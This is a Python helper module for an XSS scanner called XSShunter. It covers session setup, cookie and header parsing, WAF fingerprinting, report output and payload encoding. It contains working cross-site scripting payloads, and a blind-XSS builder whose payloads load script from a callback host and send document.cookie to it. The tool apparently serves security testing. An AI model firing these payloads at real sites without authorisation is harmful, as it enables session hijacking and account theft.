#!/usr/bin/env python3

import html
import json
import os
import random
import time
import warnings
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from http.cookies import SimpleCookie
from typing import Any, Dict, Iterable, List, Optional
from urllib.parse import quote_plus, urlparse

import requests
from colorama import Fore, Style, init
from fake_useragent import UserAgent
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

init(autoreset=True)
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

try:
    _user_agent_provider = UserAgent()
except Exception:
    _user_agent_provider = None


@dataclass
class ScanConfig:
    url: Optional[str] = None
    file: Optional[str] = None
    crawl: bool = False
    crawl_js: bool = False
    depth: int = 2
    same_domain: bool = True
    threads: int = 10
    cookie: Optional[str] = None
    header: List[str] = field(default_factory=list)
    data: Optional[str] = None
    blind: bool = False
    blind_url: Optional[str] = None
    start_collector: bool = False
    collector_port: int = 8000
    collector_wait: int = 30
    dom: bool = False
    headless: bool = False
    waf: bool = False
    payloads: Optional[str] = None
    timeout: int = 15
    output: Optional[str] = None
    verbose: bool = False
    no_color: bool = False
    check_setup: bool = False
    quiet: bool = False
    proxy: Optional[str] = None
    delay: float = 0.1
    user_agent: Optional[str] = None
    version: bool = False
    headers: Dict[str, str] = field(default_factory=dict)


def config_to_dict(config: ScanConfig) -> Dict[str, Any]:
    data = asdict(config)
    if data.get("cookie"):
        data["cookie"] = "<redacted>"
    return data


def _default_user_agent() -> str:
    if _user_agent_provider:
        try:
            return _user_agent_provider.random
        except Exception:
            pass
    return (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/124.0.0.0 Safari/537.36"
    )


def parse_cookie_string(cookie_string: Optional[str]) -> Dict[str, str]:
    if not cookie_string:
        return {}
    parsed = SimpleCookie()
    parsed.load(cookie_string)
    cookies = {name: morsel.value for name, morsel in parsed.items()}
    if cookies:
        return cookies
    result: Dict[str, str] = {}
    for part in cookie_string.split(";"):
        if "=" not in part:
            continue
        key, value = part.split("=", 1)
        key = key.strip()
        value = value.strip()
        if key:
            result[key] = value
    return result


def parse_data(raw_data: Optional[str]) -> Dict[str, str]:
    if not raw_data:
        return {}
    try:
        parsed = json.loads(raw_data)
        if isinstance(parsed, dict):
            return {str(key): "" if value is None else str(value) for key, value in parsed.items()}
    except json.JSONDecodeError:
        pass
    result: Dict[str, str] = {}
    for item in raw_data.split("&"):
        if "=" not in item:
            continue
        key, value = item.split("=", 1)
        key = key.strip()
        if key:
            result[key] = value
    return result


def build_headers(extra_headers: Optional[Dict[str, str]] = None, user_agent: Optional[str] = None) -> Dict[str, str]:
    headers = {
        "User-Agent": user_agent or _default_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    }
    if extra_headers:
        headers.update(extra_headers)
    return headers


def create_retry_adapter(retries: int = 2) -> HTTPAdapter:
    strategy = Retry(
        total=retries,
        connect=retries,
        read=retries,
        status=retries,
        backoff_factor=0.4,
        status_forcelist=[408, 429, 500, 502, 503, 504],
        allowed_methods=["GET", "POST", "HEAD", "OPTIONS"],
        raise_on_status=False,
    )
    return HTTPAdapter(max_retries=strategy, pool_connections=50, pool_maxsize=50)


def get_session(
    cookie: Optional[str] = None,
    proxy: Optional[str] = None,
    timeout: int = 15,
    retries: int = 2,
    headers: Optional[Dict[str, str]] = None,
    user_agent: Optional[str] = None,
) -> requests.Session:
    session = requests.Session()
    adapter = create_retry_adapter(retries=retries)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.headers.update(build_headers(headers, user_agent=user_agent))
    cookies = parse_cookie_string(cookie) if isinstance(cookie, str) else (cookie or {})
    if cookies:
        session.cookies.update(cookies)
    if proxy:
        session.proxies.update({"http": proxy, "https": proxy})
    session.verify = False
    session.request_timeout = timeout
    return session


def normalize_url(url: str) -> str:
    parsed = urlparse(url.strip())
    if not parsed.scheme:
        return f"http://{url.strip()}"
    return url.strip()


def load_payloads(file_path: str = "core/payloads.txt", extra_path: Optional[str] = None) -> List[str]:
    payloads: List[str] = []
    seen = set()
    defaults = [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "'><svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=confirm(1)>",
        "<body onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "javascript:alert(1)",
    ]
    
    # Track whether custom payload file was specified and successfully loaded
    custom_file_missing = False
    
    for candidate in [file_path, extra_path]:
        if not candidate:
            continue
        if not os.path.exists(candidate):
            # If this is a custom file (not default), explicitly raise error
            if candidate != "core/payloads.txt":
                raise FileNotFoundError(
                    f"Custom payload file not found: {candidate}\n"
                    f"Please verify the file path and try again."
                )
            # If default file is missing, we'll use hardcoded defaults
            continue
        with open(candidate, "r", encoding="utf-8", errors="ignore") as handle:
            for line in handle:
                payload = line.strip()
                if not payload or payload.startswith("#") or payload in seen:
                    continue
                seen.add(payload)
                payloads.append(payload)
    if not payloads:
        payloads = defaults[:]
    return payloads


def build_blind_payloads(callback_url: Optional[str], marker: Optional[str] = None) -> List[Dict[str, str]]:
    if not callback_url:
        return []
    marker = marker or f"xsshunter-{int(time.time())}"
    safe_callback = callback_url.rstrip("/")
    return [
        {"marker": marker, "payload": f"\"><script src={safe_callback}/{marker}.js></script>"},
        {"marker": marker, "payload": f"<img src=x onerror=this.src='{safe_callback}/{marker}?c='+document.cookie>"},
        {"marker": marker, "payload": f"<svg/onload=fetch('{safe_callback}/{marker}?u='+encodeURIComponent(location.href))>"},
    ]


def read_targets_from_file(path: str) -> List[str]:
    if not os.path.exists(path):
        raise OSError(f"File not found: {path}")
    targets: List[str] = []
    seen = set()
    with open(path, "r", encoding="utf-8", errors="ignore") as handle:
        for line in handle:
            target = line.strip()
            if not target or target.startswith("#"):
                continue
            normalized = normalize_url(target)
            if normalized in seen:
                continue
            seen.add(normalized)
            targets.append(normalized)
    return targets


def classify_severity(finding_type: str, verified: bool = False) -> str:
    lowered = finding_type.lower()
    if verified:
        return "critical"
    if "blind" in lowered:
        return "high"
    if "dom source to sink" in lowered:
        return "high"
    if "framework" in lowered:
        return "medium"
    if "event handler" in lowered:
        return "medium"
    if "input surface" in lowered:
        return "info"
    if "reflected" in lowered or "post xss" in lowered:
        return "high"
    return "medium"


def dedupe_findings(findings: Iterable[Dict[str, Any]]) -> List[Dict[str, Any]]:
    unique: List[Dict[str, Any]] = []
    seen = set()
    for finding in findings:
        key = (
            finding.get("url"),
            finding.get("parameter"),
            finding.get("payload"),
            finding.get("type"),
            finding.get("request_url"),
        )
        if key in seen:
            continue
        seen.add(key)
        enriched = dict(finding)
        enriched["severity"] = classify_severity(enriched.get("type", ""), bool(enriched.get("verified")))
        unique.append(enriched)
    return unique


def utc_now_iso() -> str:
    return datetime.now(timezone.utc).replace(microsecond=0).isoformat()


def save_report(findings: List[Dict[str, Any]], output_file: str, format: str = "json", metadata: Optional[Dict[str, Any]] = None) -> None:
    directory = os.path.dirname(os.path.abspath(output_file))
    os.makedirs(directory, exist_ok=True)
    metadata = metadata or {}
    report = {
        "scanner": "XSShunter",
        "version": metadata.get("version", "1.6"),
        "generated_at": utc_now_iso(),
        "total_findings": len(findings),
        "metadata": metadata,
        "findings": findings,
    }
    if format == "json":
        with open(output_file, "w", encoding="utf-8") as handle:
            json.dump(report, handle, indent=2, ensure_ascii=False)
        return
    if format == "txt":
        lines = [
            f"XSShunter Report v{report['version']}",
            f"Generated: {report['generated_at']}",
            f"Total findings: {len(findings)}",
            "=" * 72,
        ]
        for index, finding in enumerate(findings, start=1):
            lines.extend(
                [
                    f"[{index}] {finding.get('type', '')}",
                    f"  Severity: {finding.get('severity', '')}",
                    f"  URL: {finding.get('url', '')}",
                    f"  Parameter: {finding.get('parameter', '')}",
                    f"  Context: {finding.get('context', '')}",
                    f"  Verified: {finding.get('verified', False)}",
                    f"  Request URL: {finding.get('request_url', '')}",
                    f"  Payload: {finding.get('payload', '')}",
                    "",
                ]
            )
        with open(output_file, "w", encoding="utf-8") as handle:
            handle.write("\n".join(lines).rstrip() + "\n")
        return
    if format == "html":
        rows = []
        for finding in findings:
            rows.append(
                "<tr>"
                f"<td>{html.escape(str(finding.get('severity', '')))}</td>"
                f"<td>{html.escape(str(finding.get('type', '')))}</td>"
                f"<td>{html.escape(str(finding.get('url', '')))}</td>"
                f"<td>{html.escape(str(finding.get('parameter', '')))}</td>"
                f"<td>{html.escape(str(finding.get('context', '')))}</td>"
                f"<td>{html.escape(str(finding.get('verified', False)))}</td>"
                f"<td><code>{html.escape(str(finding.get('payload', '')))}</code></td>"
                "</tr>"
            )
        page = (
            "<!DOCTYPE html><html><head><meta charset='utf-8'>"
            "<title>XSShunter Report</title>"
            "<style>"
            "body{font-family:Segoe UI,Arial,sans-serif;margin:24px;background:#0f1720;color:#e8eef5}"
            "table{width:100%;border-collapse:collapse;margin-top:16px}"
            "th,td{border:1px solid #273447;padding:10px;text-align:left;vertical-align:top}"
            "th{background:#152334}"
            "tr:nth-child(even){background:#111c2a}"
            "code{white-space:pre-wrap;word-break:break-word}"
            ".meta{display:flex;gap:20px;flex-wrap:wrap}"
            ".chip{background:#152334;padding:8px 12px;border-radius:999px;border:1px solid #273447}"
            "</style></head><body>"
            f"<h1>XSShunter Report v{html.escape(str(report['version']))}</h1>"
            "<div class='meta'>"
            f"<div class='chip'>Generated: {html.escape(str(report['generated_at']))}</div>"
            f"<div class='chip'>Total Findings: {len(findings)}</div>"
            "</div>"
            "<table><tr><th>Severity</th><th>Type</th><th>URL</th><th>Parameter</th><th>Context</th><th>Verified</th><th>Payload</th></tr>"
            + "".join(rows)
            + "</table></body></html>"
        )
        with open(output_file, "w", encoding="utf-8") as handle:
            handle.write(page)
        return
    raise ValueError(f"Unsupported format: {format}")


def detect_waf(response: requests.Response) -> Optional[str]:
    signatures = {
        "Cloudflare": ["cf-ray", "cf-cache-status", "server:cloudflare"],
        "Akamai": ["x-akamai", "server:akamaighost", "akamai-origin-hop"],
        "Imperva": ["x-iinfo", "x-cdn", "visid_incap"],
        "Sucuri": ["x-sucuri-id", "x-sucuri-cache", "server:sucuri"],
        "ModSecurity": ["server:mod_security", "x-mod-security", "x-modsecurity-id"],
        "F5 Big-IP": ["x-waf-event-info", "x-cnection", "bigipserver"],
        "AWS WAF": ["x-amzn-requestid", "x-amz-cf-id", "x-amz-id"],
        "Barracuda": ["barra_counter_session", "bn", "x-barracuda"],
    }
    header_haystack = " ".join(f"{key}:{value}" for key, value in response.headers.items()).lower()
    cookie_haystack = " ".join(response.cookies.keys()).lower()
    for name, markers in signatures.items():
        score = 0
        for marker in markers:
            if marker in header_haystack or marker in cookie_haystack:
                score += 1
        if score >= 2:
            return name
    return None


def color_print(message: str, level: str = "info", end: str = "\n", quiet: bool = False) -> None:
    if quiet:
        return
    colors = {
        "info": Fore.CYAN,
        "success": Fore.GREEN,
        "error": Fore.RED,
        "warning": Fore.YELLOW,
        "critical": Fore.MAGENTA + Style.BRIGHT,
        "header": Fore.BLUE + Style.BRIGHT,
    }
    prefixes = {
        "info": "[*]",
        "success": "[+]",
        "error": "[-]",
        "warning": "[!]",
        "critical": "[!!!]",
        "header": "[>]",
    }
    color = colors.get(level, Fore.WHITE)
    prefix = prefixes.get(level, "[*]")
    print(f"{color}{prefix} {message}{Style.RESET_ALL}", end=end)


def random_delay(min_sec: float = 0.05, max_sec: float = 0.2) -> None:
    min_sec = max(0.0, min_sec)
    max_sec = max(min_sec, max_sec)
    time.sleep(random.uniform(min_sec, max_sec))


def encode_payload(payload: str, method: str = "url") -> str:
    if method == "url":
        return quote_plus(payload)
    if method == "double_url":
        return quote_plus(quote_plus(payload))
    if method == "html_entity":
        return html.escape(payload)
    return payload
